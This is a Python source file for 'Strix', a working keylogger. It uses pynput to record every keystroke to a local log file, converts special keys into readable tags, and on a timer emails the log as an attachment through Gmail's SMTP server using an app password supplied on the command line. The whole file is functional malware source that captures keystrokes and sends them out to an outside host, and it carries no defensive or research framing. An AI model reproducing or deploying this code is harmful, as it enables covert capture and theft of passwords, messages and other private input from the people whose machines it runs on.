#!/usr/bin/python
import smtplib
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
from pynput.keyboard import Listener
import threading

'''
Key logger that saves keystrokes to log.txt file in the local directory, and e-mails this file regularly to a specified e-mail.

USAGE: python strix.py < e-mail address > "< app password >" < time interval>

EXAMPLE: python strix.py johndoe@gmail.com "asa fgh aaa" 120
Assuming john doe created an app password whose value is "asa fgh aaa" from his Google account settings, and decided to send the log every two minutes

NOTE: for authentication to work, the password you provide must be an app password, and not your e-mail password.
For more information, visit https://support.google.com/accounts/answer/185833?hl=en
'''

class Keylogger:

    def __init__(self, email, password, interval):
        self.email = email
        self.password = password
        self.interval = interval
        self.logFilename = "log.txt"
        self.emailSubject = "Keylogger Report Email"
        self.emailBody = "Find attached the Strix keylogger capture."

    def appendToLog(self, key):
        keyData = str(key)                  # If you type the letter f, then keyData saves the value 'f' with single quotes.
        keyData = keyData.replace("'","")   # Remove the single quotes
        match keyData:                      # For special characters
            case "Key.alt":
                keyData = "[ALT]"
            case "Key.alt_gr":
                keyData = "[ALT GR]"
            case "Key.alt_l":
                keyData = "[LEFT ALT]"
            case "Key.alt_r":
                keyData = "[RIGHT ALT]"
            case "Key.backspace":
                keyData = "[BACKSPACE]"
            case "Key.caps_lock":
                keyData = "[CAPS LOCK]"
            case "Key.cmd":
                keyData = "[SUPER]"
            case "Key.cmd_l":
                keyData = "[SUPER LEFT]"
            case "Key.cmd_r":
                keyData = "[SUPER RIGHT]"
            case "Key.ctrl":
                keyData = "[CTRL]"
            case "Key.ctrl_l":
                keyData = "[LEFT CTRL]"
            case "Key.ctrl_r":
                keyData = "[RIGHT CTRL]"
            case "Key.delete":
                keyData = "[DELETE]"
            case "Key.down":
                keyData = "[DOWN ARROW]"
            case "Key.end":
                keyData = "[END]"
            case "Key.enter":
                keyData = "\n"
            case "Key.esc":
                keyData = "[ESCAPE]"
            case "Key.f1":
                keyData = "[F1]"
            case "Key.f2":
                keyData = "[F2]"
            case "Key.f3":
                keyData = "[F3]"
            case "Key.f4":
                keyData = "[F4]"
            case "Key.f5":
                keyData = "[F5]"
            case "Key.f6":
                keyData = "[F6]"
            case "Key.f7":
                keyData = "[F7]"
            case "Key.f8":
                keyData = "[F8]"
            case "Key.f9":
                keyData = "[F9]"
            case "Key.f10":
                keyData = "[F10]"
            case "Key.f11":
                keyData = "[F11]"
            case "Key.f12":
                keyData = "[F12]"
            case "Key.home":
                keyData = "[HOME]"
            case "Key.insert":
                keyData = "[INSERT]"
            case "Key.left":
                keyData = "[LEFT ARROW]"
            case "Key.menu":
                keyData = "[MENU]"
            case "Key.num_lock":
                keyData = "[NUM LOCK]"
            case "Key.page_down":
                keyData = "[PAGE DOWN]"
            case "Key.page_up":
                keyData = "[PAGE UP]"
            case "Key.pause":
                keyData = "[PAUSE]"
            case "Key.print_screen":
                keyData = "[PRINT SCREEN]"
            case "Key.right":
                keyData = "[RIGHT ARROW]"
            case "Key.scroll_lock":
                keyData = "[SCROLL LOCK]"
            case "Key.shift":
                keyData = ""
            case "Key.shift_l":
                keyData = ""
            case "Key.shift_r":
                keyData = ""
            case "Key.space":
                keyData = " "
            case "Key.tab":
                keyData = "   "
            case "Key.up":
                keyData = "[UP ARROW]"
            case _:
                pass
        with open(self.logFilename, "a") as log: # Opens the file if exists, creates it if it does not. Opens in append mode.
            log.write(keyData)

    def report(self):
        self.sendMail()
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def sendMail(self, server="smtp.gmail.com", port=587, useTLS=True):
        sendFrom = self.email
        sendTo = self.email
        subject = self.emailSubject
        body = self.emailBody
        file = self.logFilename

        message = MIMEMultipart()
        message['From'] = sendFrom
        message['To'] = sendTo
        message['Date'] = formatdate(localtime=True)
        message['Subject'] = subject
        message.attach(MIMEText(body))

        part = MIMEBase('application', "octet-stream")
        with open(file, 'rb') as content:
            part.set_payload(content.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename={}'.format(file))
        message.attach(part)

        smtp = smtplib.SMTP(server, port)
        if useTLS:
            smtp.starttls()
        smtp.login(self.email, self.password)
        print("Sending mail...")
        smtp.sendmail(sendFrom, sendTo, message.as_string())
        smtp.quit()

    def start(self):
        with Listener(on_press=self.appendToLog) as listener:
            self.report()
            listener.join()

if __name__ == "__main__":
    email = str(sys.argv[1])
    appPassword = str(sys.argv[2])
    interval = int(sys.argv[3])
    keyLogger = Keylogger(email, appPassword,  interval)
    keyLogger.start()